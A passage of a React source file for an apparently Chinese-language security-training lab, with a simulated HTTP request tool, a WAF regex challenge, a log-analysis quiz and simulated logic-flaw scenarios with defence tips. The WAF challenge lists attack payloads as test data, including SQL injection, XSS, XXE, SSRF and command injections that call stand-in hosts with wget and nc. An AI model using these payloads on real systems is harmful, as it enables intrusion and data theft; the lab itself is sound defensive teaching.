  const [response, setResponse] = useState('');
  const [history, setHistory] = useState<{method:string;url:string;time:string}[]>([]);

  const handleSend = () => {
    const res = `HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: ${new Date().toUTCString()}
Content-Type: application/json
Set-Cookie: session=demo123; HttpOnly; Secure

{
  "status": "success",
  "message": "模拟响应",
  "request": {
    "method": "${method}",
    "url": "${url}",
    "headers_sent": ${JSON.stringify(headers.split('\n').reduce((acc,l)=>{const[p,...v]=l.split(':');if(p&&v.length)acc[p.trim()]=v.join(':').trim();return acc;},{} as any))},
    "body": "${body.replace(/"/g,'\\"')}"
  }
}`;
    setResponse(res);
    setHistory([{method,url,time:new Date().toLocaleTimeString()},...history.slice(0,19)]);
  };

  return (
    <div className="space-y-4">
      <Card className="border-orange-600/20">
        <div className="space-y-3">
          <div className="flex gap-2">
            <select value={method} onChange={e => setMethod(e.target.value)}
              className="px-3 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm">
              <option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option><option>OPTIONS</option>
            </select>
            <input value={url} onChange={e => setUrl(e.target.value)}
              className="flex-1 px-4 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm outline-none focus:border-orange-500"/>
            <Button onClick={handleSend} className="!bg-orange-600 text-white hover:!bg-orange-500">
              <Send size={16}/> 发送
            </Button>
          </div>
          <div>
            <label className="text-xs text-gray-400 mb-1 block">Headers:</label>
            <textarea value={headers} onChange={e => setHeaders(e.target.value)}
              className="w-full px-4 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-xs outline-none focus:border-orange-500 h-20 font-mono"/>
          </div>
          <div>
            <label className="text-xs text-gray-400 mb-1 block">Body:</label>
            <textarea value={body} onChange={e => setBody(e.target.value)}
              className="w-full px-4 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-xs outline-none focus:border-orange-500 h-20 font-mono"/>
          </div>
        </div>
      </Card>
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
        <div className="lg:col-span-2">
          {response && (
            <Card className="border-green-500/20">
              <h4 className="text-sm text-green-400 mb-2">📥 Response</h4>
              <pre className="p-3 bg-black/70 rounded-lg text-xs text-gray-300 overflow-x-auto max-h-[300px] overflow-y-auto font-mono whitespace-pre-wrap">{response}</pre>
            </Card>
          )}
        </div>
        <div>
          <Card className="border-gray-700">
            <h4 className="text-sm text-gray-400 mb-2">📋 历史记录 ({history.length})</h4>
            <div className="space-y-1 max-h-[300px] overflow-y-auto">
              {history.map((h, i) => (
                <div key={i} className="flex items-center gap-2 p-1.5 rounded bg-cyber-black/30 text-xs">
                  <span className={`px-1.5 py-0.5 rounded ${h.method==='GET'?'bg-green-500/20 text-green-400':h.method==='POST'?'bg-blue-500/20 text-blue-400':'bg-yellow-500/20 text-yellow-400'}`}>{h.method}</span>
                  <span className="text-gray-400 truncate flex-1">{h.url}</span>
                  <span className="text-gray-600">{h.time}</span>
                </div>
              ))}
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
};

// ================ WAF Rules Builder ================
const WAFRulesBuilder: React.FC = () => {
  const [level, setLevel] = useState(1);
  const [rule, setRule] = useState('');
  const [result, setResult] = useState('');
  const [solved, setSolved] = useState<Set<number>>(new Set());

  const challenges = [
    { id:1, title:'拦截SQL注入', desc:'编写正则拦截包含 UNION SELECT 的请求', payloads:["1 UNION SELECT * FROM users","1' UNION SELECT 1,2,3--","1 union select password from admin"], answerHint: '(?i)union.*select' },
    { id:2, title:'拦截XSS脚本', desc:'编写正则拦截 <script> 标签', payloads:['<script>alert(1)</script>','<SCRIPT>alert("xss")</SCRIPT>','<script src="evil.js">'], answerHint: '(?i)<script' },
    { id:3, title:'拦截路径遍历', desc:'拦截 ../ 路径遍历攻击', payloads:['../../../etc/passwd','..\\..\\windows\\system32','....//....//etc/passwd'], answerHint: '\\.\\./' },
    { id:4, title:'拦截命令注入', desc:'拦截 | ; && 命令分隔符', payloads:['127.0.0.1;cat /etc/passwd','google.com && wget evil.com/shell.sh','whoami | nc attacker.com 4444'], answerHint: '[;&|]' },
    { id:5, title:'拦截文件包含', desc:'拦截 php:// 和 expect:// 等协议', payloads:['php://filter/convert.base64-encode/resource=index.php','expect://id','data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='], answerHint: '(?:php|expect|data)://' },
    { id:6, title:'拦截XXE攻击', desc:'拦截 <!DOCTYPE 和 <!ENTITY', payloads:['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>','<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;'], answerHint: '<!DOCTYPE|<!(?:ELEMENT|ENTITY)' },
    { id:7, title:'拦截SSTI模板注入', desc:'拦截 Jinja2/Twig 模板注入语法', payloads:['{{7*7}}','${7*7}','<%= 7*7 %>'], answerHint: '\\{\\{|\\$\\{|<%=' },
    { id:8, title:'拦截SSRF攻击', desc:'拦截内网IP地址请求', payloads:['http://127.0.0.1/admin','http://10.0.0.1:8080','http://169.254.169.254/latest/meta-data/'], answerHint: '127\\.0\\.0\\.1|10\\.|172\\.(?:1[6-9]|2\\d|3[01])\\.|192\\.168\\.' },
    { id:9, title:'拦截NoSQL注入', desc:'拦截MongoDB $where $regex $gt $ne 操作符', payloads:['{"$gt":""}','{"$regex":"^admin"}','{"$where":"1==1"}'], answerHint: '\\$(?:gt|regex|where|ne|eq|lt)' },
    { id:10, title:'综合WAF', desc:'编写规则同时拦截SQL注入和XSS', payloads:["1' OR '1'='1","<img src=x onerror=alert(1)>","'; DROP TABLE users;--","<svg onload=alert(1)>"], answerHint: "(?i)(union.*select|select.*from|<script|<img.*onerror|<svg.*onload|drop\\s+table)" },
  ];

  const currentChallenge = challenges[level - 1];

  const handleTest = () => {
    if (!rule.trim()) { setResult('请输入正则规则'); return; }
    try {
      const regex = new RegExp(rule, 'i');
      const results = currentChallenge.payloads.map(p => {
        const matched = regex.test(p);
        return `${matched ? '✅' : '❌'} ${p}`;
      });
      const allMatched = currentChallenge.payloads.every(p => regex.test(p));
      setResult(results.join('\n'));
      if (allMatched) {
        const newSolved = new Set(solved);
        newSolved.add(level);
        setSolved(newSolved);
      }
    } catch {
      setResult('❌ 正则表达式语法错误');
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2 overflow-x-auto pb-2">
        {challenges.map(c => (
          <button key={c.id} onClick={() => { setLevel(c.id); setRule(''); setResult(''); }}
            className={`flex-shrink-0 w-10 h-10 rounded-lg flex items-center justify-center text-sm font-medium transition ${
              solved.has(c.id) ? 'bg-green-500 text-white' :
              level===c.id ? 'bg-cyan-500 text-white' : 'bg-cyan-500/10 text-cyan-400 hover:bg-cyan-500/20'}`}>
            {solved.has(c.id) ? <CheckCircle size={16}/> : c.id}
          </button>
        ))}
      </div>
      <Card className="border-cyan-500/20">
        <h3 className="text-cyan-400 font-medium mb-1">第{level}关: {currentChallenge.title}</h3>
        <p className="text-sm text-gray-400 mb-3">{currentChallenge.desc}</p>
        <div className="mb-3">
          <p className="text-xs text-gray-500 mb-2">📋 测试Payloads:</p>
          <div className="space-y-1">
            {currentChallenge.payloads.map((p,i) => (
              <code key={i} className="block p-2 bg-black/50 rounded text-xs text-red-300 font-mono">{p}</code>
            ))}
          </div>
        </div>
        <div className="flex gap-2 mb-3">
          <input value={rule} onChange={e => setRule(e.target.value)}
            onKeyDown={e => e.key==='Enter' && handleTest()}
            placeholder="输入正则表达式规则..."
            className="flex-1 px-4 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm outline-none focus:border-cyan-500 font-mono"/>
          <Button onClick={handleTest} className="!bg-cyan-500 !text-black hover:!bg-cyan-400">
            <Shield size={16}/> 测试
          </Button>
        </div>
        {!solved.has(level) && (
          <button onClick={() => setRule(currentChallenge.answerHint)}
            className="text-xs text-gray-500 hover:text-cyan-400 transition">💡 查看提示 (使用推荐的答案模式)</button>
        )}
        {result && (
          <pre className="p-3 bg-black/50 rounded-lg text-xs text-gray-300 whitespace-pre-wrap border border-gray-700 font-mono mt-3">{result}</pre>
        )}
        {solved.has(level) && (
          <motion.div initial={{opacity:0,y:10}} animate={{opacity:1,y:0}}
            className="mt-3 p-3 bg-green-500/10 border border-green-500/30 rounded-lg flex items-center gap-2">
            <CheckCircle size={16} className="text-green-400"/>
            <span className="text-green-400 text-sm">🎉 通关！所有payload已被成功拦截</span>
          </motion.div>
        )}
      </Card>
    </div>
  );
};

// ================ Log Analysis ================
const LogAnalysis: React.FC = () => {
  const [logType, setLogType] = useState<'nginx'|'ssh'>('nginx');
  const [marked, setMarked] = useState<Set<number>>(new Set());
  const [feedback, setFeedback] = useState('');

  const nginxLogs = [
    { line: '192.168.1.10 - - [10/Jun/2026:14:30:00 +0800] "GET /index.html HTTP/1.1" 200 2326', malicious: false, reason: '正常页面访问' },
    { line: '192.168.1.10 - - [10/Jun/2026:14:30:05 +0800] "GET /admin.php HTTP/1.1" 403 162', malicious: true, reason: '尝试访问管理后台' },
    { line: '10.0.0.99 - - [10/Jun/2026:14:31:00 +0800] "GET /?id=1\' UNION SELECT * FROM users-- HTTP/1.1" 200 445', malicious: true, reason: 'SQL注入攻击' },
    { line: '10.0.0.99 - - [10/Jun/2026:14:31:02 +0800] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 892', malicious: true, reason: 'XSS攻击尝试' },
    { line: '192.168.1.10 - - [10/Jun/2026:14:32:00 +0800] "GET /images/logo.png HTTP/1.1" 200 12500', malicious: false, reason: '正常资源请求' },
    { line: '10.0.0.99 - - [10/Jun/2026:14:33:00 +0800] "POST /wp-login.php HTTP/1.1" 200 452', malicious: true, reason: '暴力破解WordPress登录' },
  ];

  const sshLogs = [
    { line: 'Jun 10 14:30:00 server sshd[12345]: Accepted password for admin from 192.168.1.10 port 22345', malicious: false, reason: '正常管理员登录' },
    { line: 'Jun 10 14:31:00 server sshd[12346]: Failed password for root from 10.0.0.99 port 33456', malicious: true, reason: '尝试以root登录' },
    { line: 'Jun 10 14:31:05 server sshd[12347]: Failed password for root from 10.0.0.99 port 33457', malicious: true, reason: '反复尝试root登录（暴力破解）' },
    { line: 'Jun 10 14:31:10 server sshd[12348]: Failed password for admin from 10.0.0.99 port 33458', malicious: true, reason: '暴力破解admin账号' },
    { line: 'Jun 10 14:32:00 server sshd[12349]: Accepted publickey for devuser from 192.168.1.20 port 44567', malicious: false, reason: '正常密钥登录' },
    { line: 'Jun 10 14:33:00 server sshd[12350]: Failed password for nobody from 10.0.0.99 port 33459', malicious: true, reason: '暴力破解继续尝试其他用户' },
  ];

  const logs = logType === 'nginx' ? nginxLogs : sshLogs;

  const toggleMark = (i: number) => {
    const newMarked = new Set(marked);
    if (newMarked.has(i)) newMarked.delete(i);
    else newMarked.add(i);
    setMarked(newMarked);
  };

  const handleCheck = () => {
    const correct = logs.filter((l,i) => l.malicious === marked.has(i));
    setFeedback(`分析结果: ${correct.length}/${logs.length} 正确识别`);
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2">
        {(['nginx','ssh'] as const).map(t => (
          <button key={t} onClick={() => { setLogType(t); setMarked(new Set()); setFeedback(''); }}
            className={`px-4 py-2 rounded-lg text-sm transition ${logType===t ? 'bg-lime-500 text-black font-medium' : 'bg-lime-500/10 text-lime-400 hover:bg-lime-500/20'}`}>
            {t === 'nginx' ? 'Nginx访问日志' : 'SSH认证日志'}
          </button>
        ))}
      </div>
      <Card className="border-lime-500/20">
        <p className="text-xs text-gray-500 mb-3">📋 点击每行标记可疑的攻击行为，然后提交验证</p>
        <div className="space-y-1 mb-4">
          {logs.map((l, i) => (
            <div key={i} onClick={() => toggleMark(i)}
              className={`p-2 rounded text-xs font-mono cursor-pointer transition border ${
                marked.has(i) ? 'bg-red-500/10 border-red-500/30 text-red-300' : 'bg-black/30 border-gray-700/50 text-gray-400 hover:border-gray-500'
              }`}>
              <span className="mr-2">{marked.has(i) ? '🔴' : '⚪'}</span>
              {l.line}
            </div>
          ))}
        </div>
        <div className="flex gap-2">
          <Button onClick={handleCheck} className="!bg-lime-400 !text-black hover:!bg-lime-300">
            <FileSearch size={16}/> 提交分析
          </Button>
          <Button variant="outline" onClick={() => { setMarked(new Set()); setFeedback(''); }}>
            <RefreshCw size={16}/> 重置
          </Button>
        </div>
        {feedback && (
          <motion.div initial={{opacity:0,y:10}} animate={{opacity:1,y:0}}
            className="mt-3 p-3 bg-lime-500/10 border border-lime-500/30 rounded-lg">
            <p className="text-sm text-lime-400">{feedback}</p>
            <div className="mt-2 space-y-1">
              {logs.map((l,i) => (
                <p key={i} className="text-xs">
                  {marked.has(i) === l.malicious ? (
                    <span className="text-green-400">✅ {l.reason}</span>
                  ) : (
                    <span className={l.malicious ? 'text-red-400' : 'text-gray-400'}>
                      {l.malicious ? `⚠️ 漏报: ${l.reason}` : `ℹ️ 误报: ${l.reason}`}
                    </span>
                  )}
                </p>
              ))}
            </div>
          </motion.div>
        )}
      </Card>
    </div>
  );
};

// ================ Logic Vulnerabilities ================
const LogicVulnerabilities: React.FC = () => {
  const [scenario, setScenario] = useState<'price'|'coupon'|'authz'|'step'|'race'>('price');

  // Price tampering state
  const [quantity, setQuantity] = useState(1);
  const [price, setPrice] = useState(99);
  const [priceMsg, setPriceMsg] = useState('');

  // Coupon abuse state
  const [couponCode, setCouponCode] = useState('');
  const [appliedCoupons, setAppliedCoupons] = useState<string[]>([]);
  const [couponMsg, setCouponMsg] = useState('');

  // Authz bypass state
  const [viewUserId, setViewUserId] = useState(1);
  const [authzMsg, setAuthzMsg] = useState('');

  // Step bypass state
  const [orderStep, setOrderStep] = useState(0);
  const [stepMsg, setStepMsg] = useState('');

  // Race condition state
  const [balance, setBalance] = useState(1000);
  const [raceMsg, setRaceMsg] = useState('');

  const resetStates = () => {
    setQuantity(1); setPrice(99); setPriceMsg('');
    setCouponCode(''); setAppliedCoupons([]); setCouponMsg('');
    setViewUserId(1); setAuthzMsg('');
    setOrderStep(0); setStepMsg('');
    setBalance(1000); setRaceMsg('');
  };

  const handleChangeScenario = (s: typeof scenario) => {
    setScenario(s);
    resetStates();
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2 flex-wrap">
        {(['price','coupon','authz','step','race'] as const).map(s => (
          <button key={s} onClick={() => handleChangeScenario(s)}
            className={`px-4 py-2 rounded-lg text-sm transition ${scenario===s ? 'bg-pink-500 text-white' : 'bg-pink-500/10 text-pink-400 hover:bg-pink-500/20'}`}>
            {{price:'价格篡改',coupon:'优惠券滥用',authz:'越权访问',step:'步骤绕过',race:'竞态条件'}[s]}
          </button>
        ))}
      </div>

      <Card className="border-pink-500/20">
        {scenario === 'price' && (<>
          <h3 className="text-pink-400 font-medium mb-1">价格篡改</h3>
          <p className="text-sm text-gray-400 mb-4">在线商城允许用户通过修改请求参数改变商品价格</p>
          <div className="flex items-center gap-3 flex-wrap">
            <div><label className="text-xs text-gray-400 block mb-1">数量</label><input type="number" value={quantity} onChange={e => setQuantity(Number(e.target.value))} className="w-20 px-3 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm"/></div>
            <div><label className="text-xs text-gray-400 block mb-1">单价(¥) 可篡改</label><input type="number" value={price} onChange={e => {setPrice(Number(e.target.value));setPriceMsg(Number(e.target.value)<0?'⚠️ 你在尝试负价格攻击！':'');}} className="w-24 px-3 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm"/></div>
            <div className="pt-5"><Button onClick={() => {const total=price*quantity;setPriceMsg(price<0?'🚨 漏洞利用成功！你通过修改价格参数以0元购买了商品！':price<50?'⚠️ 检测到异常价格！但系统未做服务端验证...':`✅ 正常购买：${quantity}件 × ¥${price} = ¥${total}`);}} className="!bg-pink-500 text-white hover:!bg-pink-400">购买</Button></div>
          </div>
          {priceMsg && <p className="text-sm text-pink-300 mt-3">{priceMsg}</p>}
          <div className="mt-4 p-3 bg-pink-500/5 rounded-lg text-xs text-gray-500"><p className="text-pink-400 mb-1">🛡️ 防御建议:</p>服务端验证价格，不信任客户端传来的价格参数</div>
        </>)}

        {scenario === 'coupon' && (<>
          <h3 className="text-pink-400 font-medium mb-1">优惠券滥用</h3>
          <p className="text-sm text-gray-400 mb-4">优惠券系统允许重复使用同一优惠码或叠加使用</p>
          <div className="flex gap-2 mb-3">
            <input value={couponCode} onChange={e => setCouponCode(e.target.value)} onKeyDown={e => e.key==='Enter' && (()=>{if(appliedCoupons.includes(couponCode)){setCouponMsg('🚨 漏洞！同一优惠券被重复使用！');}else if(couponCode==='VIP50'||couponCode==='NEW50'){setAppliedCoupons([...appliedCoupons,couponCode]);setCouponMsg(`✅ 优惠券 "${couponCode}" 已应用！`);}else{setCouponMsg('❌ 无效优惠码');}setCouponCode('');})()} placeholder="输入优惠码 (试试 VIP50 或 NEW50)..." className="flex-1 px-4 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm outline-none focus:border-pink-500"/>
            <Button onClick={() => {if(appliedCoupons.includes(couponCode)){setCouponMsg('🚨 漏洞！同一优惠券被重复使用！');}else if(couponCode==='VIP50'||couponCode==='NEW50'){setAppliedCoupons([...appliedCoupons,couponCode]);setCouponMsg(`✅ 优惠券 "${couponCode}" 已应用！`);}else{setCouponMsg('❌ 无效优惠码');}setCouponCode('');}} className="!bg-pink-500 text-white hover:!bg-pink-400">应用</Button>
          </div>
          {appliedCoupons.length>0&&<div className="flex gap-1 flex-wrap mb-2">{appliedCoupons.map((c,i)=><span key={i} className="text-xs px-2 py-1 rounded bg-pink-500/20 text-pink-300">{c}</span>)}</div>}
          {couponMsg && <p className="text-sm text-pink-300">{couponMsg}</p>}
          <p className="text-xs text-gray-500 mt-2">💡 尝试重复使用同一优惠码</p>
          <div className="mt-4 p-3 bg-pink-500/5 rounded-lg text-xs text-gray-500"><p className="text-pink-400 mb-1">🛡️ 防御建议:</p>服务端记录每个用户的优惠券使用状态，防止重复使用</div>
        </>)}

        {scenario === 'authz' && (<>
          <h3 className="text-pink-400 font-medium mb-1">越权访问</h3>
          <p className="text-sm text-gray-400 mb-4">通过修改URL中的ID参数访问其他用户的数据</p>
          <div className="flex items-center gap-3 mb-3">
            <label className="text-sm text-gray-400">用户ID:</label>
            <input type="number" value={viewUserId} onChange={e => setViewUserId(Number(e.target.value))} className="w-20 px-3 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm"/>
            <Button onClick={() => {setAuthzMsg(viewUserId===1?'✅ 查看自己的订单：Order#1001, 金额¥199':viewUserId===2?'🚨 越权漏洞！成功查看用户#2的订单：Order#2001, 金额¥999':'🚨 越权漏洞！查看用户#'+viewUserId+'的敏感数据');}} className="!bg-pink-500 text-white hover:!bg-pink-400">查看订单</Button>
          </div>
          {authzMsg && <p className="text-sm text-pink-300">{authzMsg}</p>}
          <p className="text-xs text-gray-500 mt-2">💡 你是用户#1，试试查看用户#2的订单</p>
          <div className="mt-4 p-3 bg-pink-500/5 rounded-lg text-xs text-gray-500"><p className="text-pink-400 mb-1">🛡️ 防御建议:</p>每次请求验证用户权限，确保只能访问自己的数据</div>
        </>)}

        {scenario === 'step' && (<>
          <h3 className="text-pink-400 font-medium mb-1">步骤绕过</h3>
          <p className="text-sm text-gray-400 mb-4">跳过支付步骤直接完成订单</p>
          <div className="flex gap-2 mb-3">
            <Button onClick={() => {if(orderStep===0){setOrderStep(1);setStepMsg('📋 步骤1: 确认订单信息');}else if(orderStep===1){setOrderStep(2);setStepMsg('💳 步骤2: 跳转到支付页面');}else if(orderStep===2){setOrderStep(3);setStepMsg('✅ 步骤3: 支付完成，订单确认');}else setStepMsg('🎉 订单已完成');}} className="!bg-pink-500 text-white hover:!bg-pink-400"><ArrowRight size={16}/> 下一步</Button>
            {orderStep < 3 && <Button variant="outline" onClick={() => {if(orderStep===0){setOrderStep(3);setStepMsg('🚨 漏洞！直接跳过了支付步骤完成订单！');}else setStepMsg('已经在后续步骤中');}} className="border-red-500/30 text-red-400 hover:bg-red-500/10">⚡ 跳过支付(漏洞利用)</Button>}
          </div>
          <div className="flex gap-2">{[1,2,3].map(s=><div key={s} className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-medium ${s<=orderStep?'bg-green-500 text-white':'bg-gray-700 text-gray-500'}`}>{s}</div>)}</div>
          {stepMsg && <p className="text-sm text-pink-300 mt-3">{stepMsg}</p>}
          <div className="mt-4 p-3 bg-pink-500/5 rounded-lg text-xs text-gray-500"><p className="text-pink-400 mb-1">🛡️ 防御建议:</p>服务端记录当前步骤状态，不允许跳过必要步骤</div>
        </>)}

        {scenario === 'race' && (<>
          <h3 className="text-pink-400 font-medium mb-1">竞态条件</h3>
          <p className="text-sm text-gray-400 mb-4">并发请求导致超额提现/超额购买</p>
          <p className="text-sm text-gray-300 mb-3">当前余额: <span className="text-green-400 font-mono">¥{balance}</span></p>
          <div className="flex gap-2 mb-3">
            <Button onClick={() => {if(balance>=500){setTimeout(()=>setBalance(b=>b-500),100);setRaceMsg('💰 提现请求已发送：¥500');}else{setRaceMsg('❌ 余额不足');}}} className="!bg-pink-500 text-white hover:!bg-pink-400">💰 提现 ¥500</Button>
            <Button onClick={() => {if(balance>=500){setRaceMsg('⚡ 同时发送3个并发提现请求...');setTimeout(()=>{setBalance(b=>Math.max(0,b-1500));setRaceMsg('🚨 竞态条件利用成功！在余额检查后、扣款前发送了3个请求\n原始余额: ¥1000 → 当前余额: ¥-500');},500);}}} className="bg-red-600 hover:bg-red-500">⚡ 并发攻击</Button>
          </div>
          {raceMsg && <pre className="text-sm text-pink-300 whitespace-pre-wrap">{raceMsg}</pre>}
          <div className="mt-4 p-3 bg-pink-500/5 rounded-lg text-xs text-gray-500"><p className="text-pink-400 mb-1">🛡️ 防御建议:</p>使用数据库行锁或乐观锁控制并发访问，余额检查与扣款原子化</div>
        </>)}
      </Card>
    </div>
  );
};

// ================ Main LabEnvironment Component ================
export const LabEnvironment: React.FC = () => {
  const [activeModule, setActiveModule] = useState<string>('xss');

  const renderModule = () => {
    switch (activeModule) {
      case 'xss': return <XSSSandbox />;
      case 'sqli': return <SQLInjectionLab />;
      case 'ctf': return <CTFChallenges />;
      case 'password': return <PasswordCracking />;
      case 'crypto': return <CryptoTools />;
      case 'network': return <NetworkVisualization />;
      case 'vulncode': return <VulnCodeCompare />;
      case 'burp': return <BurpSimulator />;
      case 'waf': return <WAFRulesBuilder />;
      case 'log': return <LogAnalysis />;
      case 'logic': return <LogicVulnerabilities />;
      default: return null;
    }
  };

  return (
    <div className="space-y-6">
      <div>
        <h1 className="font-orbitron text-2xl font-bold text-cyber-green">安全实验环境</h1>
        <p className="text-gray-400 mt-1">11个交互式安全实验模块，覆盖Web安全、密码学、网络攻击等领域</p>
      </div>

      {/* Module Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-3">
        {LAB_MODULES.map(mod => (
          <motion.button
            key={mod.id}
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={() => setActiveModule(mod.id)}
            className={`
              p-4 rounded-xl border text-left transition-all
              ${activeModule === mod.id
                ? `${mod.bgColor} ${mod.borderColor} shadow-lg`
                : 'bg-cyber-purple/10 border-cyber-purple/20 hover:bg-cyber-purple/20'
              }
            `}
          >
            <div className="mb-2" style={{ color: activeModule === mod.id ? mod.color : '#888' }}>
              {mod.icon}
            </div>
            <h3 className={`text-sm font-medium mb-1 ${activeModule === mod.id ? 'text-white' : 'text-gray-400'}`}>
              {mod.name}
            </h3>
            <p className="text-xs text-gray-500 line-clamp-2">{mod.description}</p>
          </motion.button>
        ))}
      </div>

      {/* Active Module Content */}
      <AnimatePresence mode="wait">
        <motion.div
          key={activeModule}
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -20 }}
          transition={{ duration: 0.2 }}
        >
          {renderModule()}
        </motion.div>
      </AnimatePresence>
    </div>
  );
};

export default LabEnvironment;
